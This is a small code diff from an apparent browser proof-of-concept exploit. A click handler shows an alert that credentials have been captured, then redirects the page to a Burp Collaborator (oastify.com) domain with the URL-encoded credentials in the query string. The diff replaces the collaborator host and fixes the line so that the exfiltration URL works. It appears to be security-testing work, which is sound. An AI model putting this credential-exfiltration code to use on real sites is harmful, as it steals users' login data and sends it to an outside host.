@@ -20,7 +20,7 @@ document.querySelector('#cccc').addEventListener('click', function() {
 
     alert('PoC; Credentials (' + credentials + ') captured and will be sent to remote endpoint! (click OK then check the address bar)');
 
-    var collabDomain = 'example1t8d.oastify.com'
-    location = 'https://' + uzx2c90b4mma0pvt3p8mhivsfjla94xt.oastify.com + '/?' + encodeURIComponent(credentials)
+    var collabDomain = '7x5famyo2zkny2t6126zfvt5dwjn7jv8.oastify.com'
+    location = 'https://' + collabDomain + '/?' + encodeURIComponent(credentials)
 });
 };
